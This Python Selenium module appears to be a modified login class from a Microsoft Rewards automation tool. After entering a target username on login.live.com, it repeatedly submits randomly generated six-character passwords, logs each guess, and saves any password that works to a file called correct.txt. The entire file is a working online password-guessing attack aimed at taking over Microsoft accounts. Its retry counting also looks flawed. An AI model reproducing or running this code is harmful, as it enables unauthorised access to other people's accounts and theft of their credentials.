import logging
import time
import urllib.parse
import random
import string
from selenium.webdriver.common.by import By
from src.browser import Browser
import contextlib

def generateRandomPassword():
    capital_letter = random.choice(string.ascii_uppercase)
    lowercase_letters = ''.join(random.choices(string.ascii_lowercase, k=2))
    numbers = ''.join(random.choices(string.digits, k=3))
    return capital_letter + lowercase_letters + numbers

class Login:
    def __init__(self, browser: Browser):
        self.browser = browser
        self.webdriver = browser.webdriver
        self.utils = browser.utils
        self.entered_password = None

    def login(self):
        """Main login method."""
        logging.info("[LOGIN] Logging-in...")
        self.webdriver.get("https://login.live.com/")
        alreadyLoggedIn = self.checkAlreadyLoggedIn()

        if not alreadyLoggedIn:
            self.executeLogin()
        self.utils.tryDismissCookieBanner()

        if self.isLoginSuccessful():
            self.writeSuccessfulPassword()

        logging.info("[LOGIN] Logged-in!")

        self.utils.goHome()
        points = self.utils.getAccountPoints()

        logging.info("[LOGIN] Ensuring login on Bing...")
        self.checkBingLogin()
        logging.info("[LOGIN] Logged-in successfully!")
        return points

    def checkAlreadyLoggedIn(self):
        """Check if the user is already logged in."""
        while True:
            try:
                self.utils.waitUntilVisible(
                    By.CSS_SELECTOR, 'html[data-role-name="MeePortal"]', 0.1
                )
                return True
            except Exception:
                try:
                    self.utils.waitUntilVisible(By.ID, "loginHeader", 0.1)
                    return False
                except Exception:
                    if self.utils.tryDismissAllMessages():
                        continue

    def executeLogin(self):
        """Execute the login process."""
        self.utils.waitUntilVisible(By.ID, "loginHeader", 10)
        logging.info("[LOGIN] Writing email...")
        self.webdriver.find_element(By.NAME, "loginfmt").send_keys(self.browser.username)
        self.webdriver.find_element(By.ID, "idSIButton9").click()

        retry_count = 0
        max_retries = 500

        while retry_count < max_retries:
            try:
                password = self.enterPassword()
                logging.info(f"[LOGIN] Trying password: {password}")
                time.sleep(3)
                if self.isLoginSuccessful():
                    break
            except Exception as e:
                logging.error(f"[LOGIN] Login attempt failed: {e}")
                retry_count += 1
                if retry_count >= max_retries:
                    logging.error("[LOGIN] Maximum retry attempts reached.")
                    raise e

        while not (
            urllib.parse.urlparse(self.webdriver.current_url).path == "/" and
            urllib.parse.urlparse(self.webdriver.current_url).hostname == "account.microsoft.com"
        ):
            self.utils.tryDismissAllMessages()
            time.sleep(1)

        self.utils.waitUntilVisible(By.CSS_SELECTOR, 'html[data-role-name="MeePortal"]', 10)

    def enterPassword(self):
        """Generate and enter a random password."""
        self.utils.waitUntilClickable(By.NAME, "passwd", 10)
        self.utils.waitUntilClickable(By.ID, "idSIButton9", 10)
        
        # Generate the random password
        password = generateRandomPassword()
        self.entered_password = password  # Store the generated password
        logging.info(f"[LOGIN] Generated random password: {password}")
        
        # If password contains special characters like " ' or \, send_keys() will not work
        password = password.replace("\\", "\\\\").replace('"', '\\"')
        self.webdriver.execute_script(
            f'document.getElementsByName("passwd")[0].value = "{password}";'
        )
        logging.info("[LOGIN] Writing password...")
        self.webdriver.find_element(By.ID, "idSIButton9").click()
        
        return password

    def isLoginSuccessful(self):
        """Check if login was successful."""
        try:
            self.utils.waitUntilVisible(By.CSS_SELECTOR, 'html[data-role-name="MeePortal"]', 10)
            return True
        except Exception:
            return False

    def writeSuccessfulPassword(self):
        """Write the successful password to a file."""
        if self.entered_password:
            with open("correct.txt", "w") as file:
                file.write(f"Successful password: {self.entered_password}\n")
        else:
            logging.warning("[LOGIN] No password available to write to file.")

    def checkBingLogin(self):
        """Ensure the user is logged in on Bing."""
        self.webdriver.get(
            "https://www.bing.com/fd/auth/signin?action=interactive&provider=windows_live_id&return_url=https%3A%2F%2Fwww.bing.com%2F"
        )
        while True:
            currentUrl = urllib.parse.urlparse(self.webdriver.current_url)
            if currentUrl.hostname == "www.bing.com" and currentUrl.path == "/":
                time.sleep(3)
                self.utils.tryDismissBingCookieBanner()
                with contextlib.suppress(Exception):
                    if self.utils.checkBingLogin():
                        return
            time.sleep(1)
